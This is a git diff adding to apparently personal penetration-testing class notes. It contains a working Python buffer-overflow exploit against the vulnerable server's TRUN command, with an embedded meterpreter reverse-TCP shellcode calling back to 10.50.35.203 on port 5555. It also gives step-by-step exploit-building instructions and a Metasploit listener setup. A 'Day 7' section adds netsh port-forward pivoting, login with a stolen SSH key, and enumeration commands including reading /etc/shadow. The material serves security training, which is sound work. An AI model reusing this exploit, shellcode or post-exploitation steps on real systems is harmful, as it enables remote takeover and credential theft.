@@ -323,9 +323,113 @@ msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
 
 make script to connect to vuln server
 
+```
+#!/usr/bin/env python
+import socket
+
+buf = "TRUN /.:/"
+buf += "A" * 2003
+buf += "\xa0\x12\x50\x62"
+buf += "\x90" * 10
+## msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.35.203 lport=5555 -b "\x00" -f python
+buf += b"\xbf\x43\x95\xe3\x4e\xda\xcf\xd9\x74\x24\xf4\x5e"
+buf += b"\x2b\xc9\xb1\x59\x31\x7e\x14\x83\xee\xfc\x03\x7e"
+buf += b"\x10\xa1\x60\x1f\xa6\xaa\x8b\xe0\x37\xd4\xba\x32"
+buf += b"\xbe\xf1\xd9\x39\x93\xc9\xaa\x6c\x18\xa2\xff\x84"
+buf += b"\xab\xc6\xd7\xab\x1c\x6c\x0e\x85\x9d\x41\x8e\x49"
+buf += b"\x5d\xc0\x72\x90\xb2\x22\x4a\x5b\xc7\x23\x8b\x2d"
+buf += b"\xad\xcc\x41\x25\x1f\x02\xed\x7b\x9c\x75\xf0\xab"
+buf += b"\x57\x39\x8a\xce\xa8\xcd\x26\xd0\xf8\xa6\xef\xf2"
+buf += b"\x73\xf0\x17\xf2\x50\x50\xad\x3d\x22\x6c\x9c\x42"
+buf += b"\x82\x07\xea\x37\x14\xc1\x22\x88\xd6\x22\x49\xa4"
+buf += b"\xd8\x7b\x6a\x54\xaf\x77\x88\xe9\xa8\x4c\xf2\x35"
+buf += b"\x3c\x52\x54\xbd\xe6\xb6\x64\x12\x70\x3d\x6a\xdf"
+buf += b"\xf6\x19\x6f\xde\xdb\x12\x8b\x6b\xda\xf4\x1d\x2f"
+buf += b"\xf9\xd0\x46\xeb\x60\x41\x23\x5a\x9c\x91\x8b\x03"
+buf += b"\x38\xda\x3e\x55\x3c\x23\xc1\x5a\x60\xb3\x0d\x97"
+buf += b"\x9b\x43\x1a\xa0\xe8\x71\x85\x1a\x67\x39\x4e\x85"
+buf += b"\x70\x48\x58\x36\xae\xf2\x09\xc8\x4f\x02\x03\x0f"
+buf += b"\x1b\x52\x3b\xa6\x24\x39\xbb\x47\xf1\xd7\xb1\xdf"
+buf += b"\xf0\x15\xe5\xd4\x6d\x5b\xe9\xff\xde\xd2\x0f\xaf"
+buf += b"\x70\xb4\x9f\x10\x21\x74\x70\xf9\x2b\x7b\xaf\x19"
+buf += b"\x54\x56\xd8\xb0\xbb\x0e\xb0\x2c\x25\x0b\x4a\xcc"
+buf += b"\xaa\x86\x36\xce\x21\x22\xc6\x81\xc1\x47\xd4\xf6"
+buf += b"\xb5\xa7\x24\x07\x50\xa7\x4e\x03\xf2\xf0\xe6\x09"
+buf += b"\x23\x36\xa9\xf2\x06\x45\xae\x0d\xd7\x7f\xc4\x38"
+buf += b"\x4d\x3f\xb2\x44\x81\xbf\x42\x13\xcb\xbf\x2a\xc3"
+buf += b"\xaf\xec\x4f\x0c\x7a\x81\xc3\x99\x85\xf3\xb0\x0a"
+buf += b"\xee\xf9\xef\x7d\xb1\x02\xda\xfd\xb6\xfc\x98\x29"
+buf += b"\x1f\x94\x62\x6a\x9f\x64\x09\x6a\xcf\x0c\xc6\x45"
+buf += b"\xe0\xfc\x27\x4c\xa9\x94\xa2\x01\x1b\x05\xb2\x0b"
+buf += b"\xfd\x9b\xb3\xb8\x26\x2c\xc9\xb1\xd9\xcd\x2e\xd8"
+buf += b"\xbd\xce\x2e\xe4\xc3\xf3\xf8\xdd\xb1\x32\x39\x5a"
+buf += b"\xc9\x01\x1c\xcb\x40\x69\x32\x0b\x41"
+
+## 625012a0 
+## \xa0\x12\x50\x62
+
+s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM) ## Create IPv4 TCP
+s.connect(("127.0.0.1", 4321)) ## Private IP of winops secureserver
+print s.recv(1024) ## Print what is received
+s.send(buf) ## Send buf variable
+print s.recv(1024) ## Once again print what is received
+s.close() ## Close socket
+```
+
 use vulnerable commands ```trun /.:/```
 
 use 5000 character string to crash program and find EIP in immunity db
 
 use EIP to find offset and iterate a single character that many times
 
+set buf to TRUN /.:/ and += yuor iteration line
+
+create a nop slep with += "\x90" * 10 (if 10 doesn't work go somewhere between 11-20)
+
+use the msfvenom script to generate the little endian shell code 
+
+open msfconsole and run
+```
+use miltihandler
+set payload windows/meterpreter/reverse_tcp
+set lhost
+set lport
+run
+```
+
+run script in python
+
+# Day 7
+
+#### Similar to control sockets but usable for Windows machines without SSH
+```
+netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
+netsh interface portproxy show all
+netsh interface portproxy delete v4tov4 listenport=<LocalPort>
+netsh interface portproxy reset
+```
+
+#### SSH keys
+```
+chmod 600 /home/student/stolenkey
+ssh -i /home/student/stolenkey jane@1.2.3.4
+```
+
+#### Enumeration Commands
+ * Windows
+```
+net user
+tasklist /v
+tasklist /svc & get ciminstance
+ipconfig /all
+```
+
+ * Linux
+```
+sudo -l
+cat /etc/passwd & /etc/shadow
+ps -elf
+chkconfig (SysV) & systemctl --type=service (SystemD)
+ifconfig -a (SysV) & ip a (SystemD)
+netstat (SysV) & ss -ntlp (SystemD)
+```
